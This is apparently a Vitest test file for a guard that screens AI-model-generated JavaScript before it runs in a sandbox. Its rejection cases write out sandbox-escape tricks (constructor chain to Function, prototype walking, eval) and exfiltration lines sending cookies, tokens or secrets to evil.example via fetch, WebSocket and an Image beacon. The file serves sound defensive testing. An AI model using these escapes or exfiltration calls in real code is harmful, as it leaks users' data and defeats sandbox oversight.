import { describe, expect, it } from "vitest";
import { guardCode } from "./guard";

function expectRejected(code: string) {
  const result = guardCode(code);
  expect(result.ok, `expected rejection, but this was accepted:\n${code}`).toBe(false);
  expect(result.reason).toBeTruthy();
  return result;
}

function expectAccepted(code: string) {
  const result = guardCode(code);
  expect(result.ok, `expected acceptance, but it was rejected: ${result.reason}\n${code}`).toBe(true);
  return result;
}

describe("legitimate code the model actually writes", () => {
  it("accepts API calls, loops, destructuring and async/await", () => {
    expectAccepted(`
      const tasks = await listTasks();
      const open = tasks.filter((t) => t.status !== "completed");
      let total = 0;
      for (const { estimate = 0 } of open) {
        total += estimate;
      }
      const byStatus = {};
      for (let i = 0; i < open.length; i++) {
        const status = open[i].status;
        byStatus[status] = (byStatus[status] ?? 0) + 1;
      }
      return { count: open.length, total, byStatus };
    `);
  });

  it("accepts built-ins, functions, try/catch and template literals", () => {
    expectAccepted(`
      const ids = new Set([1, 2, 3]);
      function double(n) { return n * 2; }
      const triple = (n) => n * 3;
      try {
        return \`\${double(2)}-\${triple(3)}-\${Math.max(...ids)}\` + JSON.stringify({ ok: true });
      } catch (error) {
        console.log(error.message);
        return String(new Date().getFullYear());
      }
    `);
  });
});

describe("the API may be a deep, dynamic object tree", () => {
  // The guard restricts language constructs, not the app's vocabulary. It never
  // sees the API object, so nothing here depends on knowing its keys up front.
  it("accepts walking a nested app tree", () => {
    expectAccepted(`
      const feature = kernel.model.features[0];
      const width = feature.params.width;
      kernel.sketch.session.commit({ width: width * 2 });
      return kernel.model.features.map((f) => f.params);
    `);
  });

  it("accepts names the guard has never heard of", () => {
    // A function added to the API at runtime, a helper injected by the host,
    // a library the app deliberately exposes – all fine.
    expectAccepted(`
      const schema = schemaForType("extrude");
      return addFeatureCall("extrude", JSON.stringify({ depth: 10 }));
    `);
    expectAccepted("return dayjs().year();");
  });

  it("accepts app fields that happen to share a name with a blocked global", () => {
    // `task.location` is the app's data, not window.location. Only the
    // identifier *reference* is blocked, never a property name.
    expectAccepted(`
      const task = listTasks()[0];
      return { where: task.location, who: task.parent, doc: task.document };
    `);
  });

  it("accepts a dynamic key that is a variable", () => {
    expectAccepted(`
      const key = "width";
      return kernel.params[key];
    `);
  });
});

describe("a blocked name only means the global of that name", () => {
  // Blocking bare names would otherwise reject ordinary code: `open`, `parent`,
  // `top` and `self` are variable names the model uses all the time.
  it("accepts locally declared variables that shadow a blocked global", () => {
    expectAccepted(`
      const open = listTasks().filter((t) => !t.done);
      const parent = open[0].parent;
      let top = open.length;
      for (const self of open) { top += self.estimate; }
      return { open: open.length, parent, top };
    `);
  });

  it("accepts them as parameters and destructured bindings", () => {
    expectAccepted(`
      const pick = ({ parent, top }, open) => parent + top + open;
      function walk(document) { return document.id; }
      return pick({ parent: 1, top: 2 }, 3) + walk({ id: 4 });
    `);
  });

  it("still rejects the global when nothing declares it", () => {
    expectRejected("return open;");
    expectRejected("return parent.document;");
    // Declared inside a function, used outside it: that is the real global.
    expectRejected(`
      function inner() { const open = 1; return open; }
      inner();
      return open("https://evil.example");
    `);
  });
});

describe("sandbox escapes", () => {
  it("rejects `this`", () => {
    expectRejected("return this;");
  });

  it("rejects the constructor chain to Function", () => {
    expectRejected(`return [].constructor.constructor("return globalThis")();`);
    expectRejected("return ({}).constructor;");
    expectRejected(`return listTasks["constructor"];`);
  });

  it("rejects prototype walking", () => {
    expectRejected("return Object.getPrototypeOf(listTasks);");
    expectRejected("return listTasks.prototype;");
    expectRejected("return ({}).__proto__;");
  });

  it("rejects eval, Function and dynamic import", () => {
    expectRejected(`return eval("1+1");`);
    expectRejected(`return new Function("return 1")();`);
    expectRejected(`return import("./secrets.js");`);
  });

  it("rejects `arguments`, Proxy and Reflect", () => {
    expectRejected("function f() { return arguments; } return f(1);");
    expectRejected("return new Proxy({}, {});");
    expectRejected("return Reflect.get({}, 'x');");
  });

  it("rejects a key assembled from an expression", () => {
    expectRejected(`return listTasks["constr" + "uctor"];`);
    expectRejected(`const key = "constructor"; return listTasks[key.slice(0)];`);
    expectRejected("return kernel[keys[j]];");
  });
});

describe("the exfiltration channels", () => {
  it("rejects the global object under every name it has", () => {
    expectRejected("return globalThis;");
    expectRejected("return window.location.href;");
    expectRejected("return self;");
    expectRejected("return top.document;");
  });

  it("rejects the DOM", () => {
    expectRejected("return document.cookie;");
    expectRejected("return navigator.userAgent;");
    expectRejected("history.back();");
  });

  it("rejects every way out to the network", () => {
    expectRejected(`return fetch("https://evil.example");`);
    expectRejected("return new XMLHttpRequest();");
    expectRejected(`new WebSocket("wss://evil.example");`);
    // The one a naive blocklist forgets: an <img> is a GET request with a body
    // you control.
    expectRejected(`const img = new Image(); img.src = "https://evil.example/?" + secret;`);
    expectRejected(`new Worker("https://evil.example/w.js");`);
    expectRejected(`open("https://evil.example");`);
  });

  it("rejects storage", () => {
    expectRejected(`return localStorage.getItem("token");`);
    expectRejected("return sessionStorage.length;");
    expectRejected("return indexedDB.databases();");
  });

  it("rejects timers, because setTimeout evaluates a string argument", () => {
    expectRejected(`setTimeout("alert(1)", 0);`);
    expectRejected("setInterval(() => {}, 100);");
  });

  it("rejects native dialogs", () => {
    expectRejected(`alert("hi");`);
    expectRejected(`return confirm("sure?");`);
  });
});

describe("configuration", () => {
  it("blocks the host's own globals when asked", () => {
    expect(guardCode("return APP.config;").ok).toBe(true);
    expect(guardCode("return APP.config;", { extraBlocked: ["APP"] }).ok).toBe(false);
  });

  it("can unblock a name the host needs", () => {
    expect(guardCode("setTimeout(() => {}, 10);").ok).toBe(false);
    expect(guardCode("setTimeout(() => {}, 10);", { allowBlocked: ["setTimeout"] }).ok).toBe(true);
  });
});

describe("limits and diagnostics", () => {
  it("rejects code above the length limit", () => {
    const result = guardCode(`return "${"x".repeat(200)}";`, { maxLength: 50 });
    expect(result.ok).toBe(false);
    expect(result.reason).toMatch(/too long/i);
  });

  it("rejects code above the node limit", () => {
    const result = guardCode("return 1 + 1 + 1 + 1 + 1;", { maxNodes: 5 });
    expect(result.ok).toBe(false);
    expect(result.reason).toMatch(/too complex/i);
  });

  it("reports a syntax error instead of throwing", () => {
    const result = guardCode("return {;");
    expect(result.ok).toBe(false);
    expect(result.reason).toMatch(/syntax error/i);
  });

  it("reports the line of the violation in the model's own source", () => {
    const result = guardCode("const a = 1;\nconst b = 2;\nreturn this;");
    expect(result.ok).toBe(false);
    expect(result.at?.line).toBe(3);
  });
});
